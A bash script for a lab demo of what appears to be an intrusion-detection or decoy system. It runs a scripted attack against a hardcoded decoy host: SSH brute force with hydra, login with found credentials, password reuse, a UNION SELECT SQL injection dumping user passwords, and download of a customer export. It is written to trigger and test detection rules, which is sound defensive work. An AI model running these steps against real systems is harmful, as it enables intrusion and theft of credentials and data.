#!/usr/bin/env bash
# Owner: M4. P3 "targeted human" run for the demo. Runs on Laptop A (Kali) only.
# Needs: hydra, sshpass, curl.  Usage: bash scenarios/attack_p3.sh 192.168.77.20
set -euo pipefail

TARGET="${1:-}"
if [ "$TARGET" != "192.168.77.20" ]; then
  echo "Refusing: this script only targets the lab decoy 192.168.77.20" >&2
  exit 1
fi
SSH_PORT=2222
WEB="http://${TARGET}:8080"
pause() { echo; echo ">>> $1"; sleep "${STEP_DELAY:-4}"; }

pause "1. SSH brute force (6 wrong passwords, then the right one). Expect R01."
printf 'admin\n123456\npassword\nqwerty\nletmein\nwelcome1\nDemoPass-2026\n' > /tmp/dg_p3_words.txt
hydra -l dg_demo -P /tmp/dg_p3_words.txt -s "$SSH_PORT" -t 1 -W 1 "ssh://${TARGET}" || true

pause "2. Log in and look around. Expect R02, R03."
sshpass -p 'DemoPass-2026' ssh -p "$SSH_PORT" -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
  dg_demo@"$TARGET" 'whoami; ls -la; cat notes.txt' || true

pause "3. Reuse the portal password from notes.txt on the web login. Expect strong-candidate link."
curl -s -o /dev/null -w "login %{http_code}\n" -c /tmp/dg_p3_cookies -X POST "$WEB/login" \
  -d 'username=svc_portal&password=DGLAB-Portal-4471'

pause "4. SQL injection on search. Expect R07 (sqli)."
curl -s -o /dev/null -w "search %{http_code}\n" -b /tmp/dg_p3_cookies --get "$WEB/search" \
  --data-urlencode "q=x' UNION SELECT username,password FROM users--"

pause "5. Download the customer export. Expect R04."
curl -s -o /tmp/dg_customer_data.csv -w "download %{http_code}\n" -b /tmp/dg_p3_cookies "$WEB/download?file=customer_data.csv"

echo
echo ">>> Now on the dashboard: confirm the link, then block. Press Enter after blocking to test the block."
read -r
curl -s -o /dev/null -w "after block %{http_code} (expect 403)\n" "$WEB/"
rm -f /tmp/dg_p3_words.txt /tmp/dg_p3_cookies
